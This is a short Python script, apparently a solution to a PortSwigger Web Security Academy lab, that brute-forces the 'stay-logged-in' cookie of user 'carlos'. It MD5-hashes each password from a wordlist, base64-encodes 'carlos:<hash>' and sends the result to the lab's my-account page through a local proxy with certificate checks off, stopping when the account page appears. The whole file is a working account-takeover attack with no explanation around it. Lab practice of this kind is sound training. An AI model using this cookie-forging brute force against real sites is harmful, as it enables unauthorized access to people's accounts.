import requests
import warnings
import hashlib
import base64

from urllib3.exceptions import InsecureRequestWarning

warnings.filterwarnings("ignore", category=InsecureRequestWarning)
password_file='password.txt'


target_url='https://0aff008304f2e546c33a6f7f00da00ec.web-security-academy.net/my-account'
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}




def brute():
    with open(password_file,'r') as f:
        for password in f.read().split("\n"):
            string = f"{password}"

            #get md5 hash of password
            hash_object = hashlib.md5(string.encode())
            hash_hex = hash_object.hexdigest()

            cookie_value = f"carlos:{hash_hex}"
            #get base64 format of hash value
            encoded_bytes = base64.b64encode(cookie_value.encode())
            encoded_cookie = encoded_bytes.decode()

            cookies = {
              'stay-logged-in': encoded_cookie
                }
            response=requests.get(url=target_url,cookies=cookies,proxies=proxies,verify=False)
            if "Update email" in response.text:
                print(f"Congrats carlos:{password} [+]")
                break
            else:
                print(f"carlos:{password} [-]")


if __name__ == "__main__":
    brute()